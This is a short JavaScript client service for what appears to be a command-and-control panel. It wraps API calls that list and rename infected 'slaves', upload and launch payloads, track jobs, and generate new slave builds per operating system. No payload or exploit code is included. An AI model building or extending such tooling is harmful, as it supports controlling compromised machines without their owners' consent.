import axios from "axios"

export default class UserService {

    constructor() {
        this.baseURL = localStorage.getItem("baseURL");
        this.instance = axios.create({
            baseURL: this.baseURL,
            headers: {
                'Authorization' : localStorage.getItem("authToken")
            }
        }); 
    }
    
    connectServer() {
        return axios.post("/client/login",{}, { baseURL: this.baseURL});
    }

    connectServer(username, password) {
        return axios.post("/client/login", {
            username: username,
            password: password
        }, {
            baseURL: this.baseURL
        })
    }

    checkToken() {
        return this.instance.get("/client/ping")
    }

    setNickName(slaveId, nickname) {
        return this.instance.post("/client/slaves/nickname", {
            slaveId: slaveId,
            nickname: nickname
        })
    }

    getSlaves() {
        return this.instance.get("/client/slaves");
    }

    getPayloads() {
        return this.instance.get("/payload");
    }

    newPayload(payload, payloadFile) {

        const formData = new FormData();
        formData.append("payloadFile", payloadFile);
        formData.append("payload", JSON.stringify(payload));

        return this.instance.post("/payload", formData);
    }

    getJobs() {
        return this.instance.get("/payload/jobs")
    }

    getCategories() {
        return this.instance.get("/payload/categories");
    }

    launchPayload (payload) {
        return this.instance.post("/payload/launch", payload);
    }

    generateSlave(nickname, os, payload) {
        return this.instance.post("/client/slaves", {
            nickname: nickname,
            os: os,
            payload: payload
        })
    }
}
